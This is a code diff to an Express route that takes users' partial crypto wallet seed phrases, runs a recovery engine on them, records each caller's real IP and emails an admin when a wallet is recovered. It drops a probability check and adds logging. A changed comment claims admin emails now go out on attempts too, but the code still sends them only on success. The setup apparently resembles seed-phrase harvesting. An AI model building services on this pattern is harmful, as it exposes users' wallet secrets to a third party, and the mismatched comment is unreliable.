@@ -1299,15 +1299,18 @@ router.post('/recover-wallet-phrase', async (req, res) => {
         analysisResult = await recoveryEngine.analyzePartialPhrase(partialPhrase, hints);
         console.log('📊 Analysis complete:', analysisResult.successProbability);
         
-        // Only attempt recovery if analysis shows good probability AND user selected a recovery method
-        if (analysisResult.successProbability > 0.3 && recoveryMethod && recoveryMethod !== 'Analysis Only') {
+        // Always attempt recovery if user selected a recovery method (removed probability gate)
+        console.log('🔍 Recovery check - Method:', recoveryMethod, 'Probability:', analysisResult.successProbability);
+        if (recoveryMethod && recoveryMethod !== 'Analysis Only') {
           console.log('🔄 Starting recovery process...');
           recoveryResult = await recoveryEngine.recoverWallet({
             partialPhrase,
             walletHints: hints,
             recoveryMethod: recoveryMethod
           });
-          console.log('🔄 Recovery result:', recoveryResult.success);
+          console.log('🔄 Recovery result:', recoveryResult?.success || 'failed');
+        } else {
+          console.log('⚠️ Recovery skipped - Method:', recoveryMethod);
         }
       } catch (analysisError) {
         console.log('Analysis error (continuing with manual review):', analysisError.message);
@@ -1316,7 +1319,7 @@ router.post('/recover-wallet-phrase', async (req, res) => {
 
     const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
     
-    // ONLY send admin email if recovery was SUCCESSFUL
+    // Send admin email for both success AND attempts
     if (recoveryResult?.success) {
       console.log('📧 Sending success email to admin...');
       
